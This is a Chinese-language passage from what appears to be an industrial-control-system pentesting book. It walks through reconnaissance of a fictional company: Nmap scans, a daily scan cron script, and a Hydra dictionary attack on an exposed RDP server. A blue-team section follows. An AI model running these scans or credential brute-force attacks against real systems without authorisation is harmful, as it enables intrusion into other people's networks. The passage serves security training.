

| 父节点 | NET0 (NET-0-0-0-0-0) |
|---|---|
| 网络类型 | 直接分配 |
| 源AS | |
| 组织 | Z 公司 - 强攻工控系统 |
| 注册日期 | 2014-01-13 |
| 更新时间 | 2017-03-12 |
| 参考链接 | https://rdap.arin.net/registry/ip/10.0.0.0 |

通过两次简单的公开信息查询，我们现在得知 *Z 公司* 拥有公共 IP 地址范围 10.0.0.0 - 10.0.0.255。

不过请注意，聘请你进行红队演练的公司通常会指定 IP 地址范围（合同边界）。然而，在本练习中，我们将忽略这一事实，同时也忽略 10.0.0.0 是 A 类私有地址范围这一事实。

## 对网络范围进行初步扫描

既然我们已经知道 *Z 公司* 拥有的 IP 地址范围，我们便可以开始探测该范围，以查找暴露的服务和弱点。我们将保持简单，使用 **Nmap** 来完成这项任务。我们执行以下扫描：

```
$ sudo nmap 10.0.0.0/24 -n -Pn --open
Host discovery disabled (-Pn). All addresses will be marked
'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-22 19:39 MST
```

我们告诉 **Nmap** 使用 `-n` 不进行 **域名系统（DNS）** 查询，使用 `-Pn` 将 10.0.0.0/24 范围内的所有 IP 地址视为在线（互联网上的设备通常被配置为显示为离线），并使用 `--open` 仅显示开放端口。当扫描完成时，结果令人极度失望，正如我们所见：

```
... Nmap scan report for 10.0.0.120
Host is up (0.00071s latency) .
Not shown: 999 filtered ports
Some closed ports may be reported as filtered due to --defeat-
rst-ratelimit
PORT STATE SERVICE
80/tcp open http

Nmap done: 256 IP addresses (256 hosts up) scanned in 1024.26 seconds
```

此外，查看那个唯一的开放端口发现了一个简单的静态网页——没有特别之处，没有动态内容，也没有任何可供攻击的 Web 应用程序，正如我们所见：

![](img/c8ffa9959721097701584fcc95101362_616_0.png)

图 16.1 – Z 公司坚不可摧的网站

我们对运行在 10.0.0.120 上的服务器运行了 Nikto、Nessus 和 Nmap 扫描，但无法找到服务器、Web 服务或运行在 Web 服务器上的网页的任何漏洞。是时候开始考虑实地访问工厂了。在准备现场行程的同时，我们应该设置一个定期扫描，以查看我们能否检测到 *Z 公司* 公共存在的变化。

## 设置定期扫描

为了定期验证 *Z 公司* 的公共存在是否发生变化（突然出现的额外服务器或开放端口），我们将设置一个简单粗糙的每日端口扫描，以查找 *Z 公司* 公共姿态的变化。为此，请遵循以下说明：

1. 在 Kali Linux 中运行 `sudo gedit /usr/bin/daily_scan.sh` 创建以下脚本，并在脚本中输入以下命令：

```bash
#!/bin/bash
mkdir /opt/daily_scan
today=$(date +%Y-%m-%d)
yesterday=$(date -d yesterday +%Y-%m-%d)
/usr/bin/nmap -T5 -oX /opt/daily_scan/scan_$today.xml -n -Pn 10.0.0.0/24 > /dev/null 2>&1
if [ -e /opt/daily_scan/scan_$yesterday.xml ]; then
    /usr/bin/ndiff /opt/daily_scan/scan_$yesterday.xml /opt/daily_scan/scan_$today.xml > /opt/daily_scan/changes_$today.txt
fi
```

在脚本中，我们执行每日 Nmap 扫描并保存带有今日日期的结果：`nmap -T5 -oX /opt/daily_scan/scan_$today.xml -n -Pn 10.0.0.0/24`。然后使用 `ndiff /opt/daily_scan/scan_$yesterday.xml` 将今天的结果与昨天的扫描结果进行比较，并将任何差异存储在 `/opt/daily_scan/changes_$today.txt` 中。

2. 编辑完 Bash 脚本后，保存文件并关闭 `gedit`。现在，我们将通过运行 `sudo vi /etc/crontab` 命令并在 crontab 文件底部添加以下行，来设置一个 crontab 任务，使该脚本每天凌晨 1 点运行：

```
0 1 * * * root /usr/bin/daily_scan.sh
```

这将指示 Kali Linux 每天凌晨 1 点运行我们的 shell 脚本。注意：crontab 文件是在 Linux 系统上计划重复任务（cron 作业）的一种方式（[https://man7.org/linux/man-pages/man5/crontab.5.html](https://man7.org/linux/man-pages/man5/crontab.5.html)）。

在我们开始探索不同的攻击方法时，现在我们已经针对 *Z 公司* 公共姿态的变化设置了检查机制。

## 蓝队观察

蓝队通常无法检测有人对公共 IP 地址范围和物理地址进行公开侦察。然而，他们应该定期检查这些公共资源是否泄露了过多信息。对你的域名进行 WHOIS 查询，并检查敏感信息，如公司电子邮件地址、你不想暴露的电话号码，甚至密码（是的——这种情况确实发生过）。

一旦攻击进入扫描系统阶段，蓝队应该开始注意到防火墙日志中弹出额外的日志。当然，如果你的网页通常有大量流量，或者如果攻击者行动缓慢，这种额外的流量可能不会引起警报。鉴于大多数公共 IP 地址每天都会被多次进行端口扫描，且这些扫描通常不会导致被入侵，此类噪音变得司空见惯。

## 发现新 IP/服务 – 开始攻击

就在我们收拾行李准备前往 *Z 公司* 生产工厂进行公路旅行时，我们注意到已经运行了几天的每日脚本检测到 *Z 公司* 公共网络存在的变化。以下是我们在 Kali Linux 机器上生成的 `ndiff` 文件的内容：

```text
cat /opt/daily_scan/changes_2021-02-22.txt
-Nmap 7.91 scan initiated Mon Feb 22 20:43:47 2021 as: /usr/bin/nmap -T5 -oX /opt/daily_scan/scan_2021-02-22.xml -n -Pn 10.0.0.120,125,130,150,157
+Nmap 7.91 scan initiated Mon Feb 22 20:45:43 2021 as: /usr/bin/nmap -T5 -oX /opt/daily_scan/scan_2021-02-22.xml -n -Pn 10.0.0.120,125,130,150,157

10.0.0.157:
-Not shown: 1000 filtered ports
+Not shown: 999 filtered ports
  PORT      STATE SERVICE       VERSION
+3389/tcp  open  ms-wbt-server
```

输出显示 Nmap 扫描发现了一个额外暴露的 IP 地址：`10.0.0.157`。该 IP 地址有一个开放的端口 3389，通常用于 Microsoft **远程桌面协议（RDP）**。

## 使用 Hydra 测试常见用户名和密码

让我们看看 *Z 公司* 公共 IP 地址范围内新出现的服务器是否有任何可利用的漏洞。我们运行了 Nmap 和 Nessus 扫描，甚至盲目地在服务器上尝试了 **Metasploit** 中的 **BlueKeep 模块**（https://pentest-tools.com/blog/bluekeep-exploit-metasploit/），但都没有成功。是时候改变策略，看看我们是否能发现一个非常常见的配置错误：容易猜解的凭据。很可能是有人启动了测试或开发服务器并意外地将其暴露在互联网上。在这种情况下，发现更多安全卫生最佳实践中的疏漏（例如弱密码）并不罕见。

在下一节中，我们将使用强大的暴力破解工具 **Hydra**（https://github.com/vanhauser-thc/thc-hydra）在 RDP 服务器上测试常见的用户和密码。

我们将对 RDP 服务执行字典攻击。该攻击将尝试常见的用户名和密码，直到列表耗尽或找到一组可用的凭据为止。以下命令将尝试提供的单词列表中的每个用户名和密码组合：

```
$ hydra -L /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top1000.txt 10.0.0.157 rdp
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-22 17:08:47
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
```

